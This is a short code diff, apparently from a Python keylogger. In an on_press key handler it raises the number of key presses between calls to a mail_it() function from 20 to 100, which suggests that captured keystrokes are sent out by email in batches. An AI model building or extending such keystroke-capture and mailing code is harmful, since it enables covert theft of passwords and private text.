@@ -48,7 +48,7 @@ def on_press(key):
 	
 	global counter
 	counter += 1
-	if counter % 20 == 0:
+	if counter % 100 == 0:
 		mail_it()
 
 
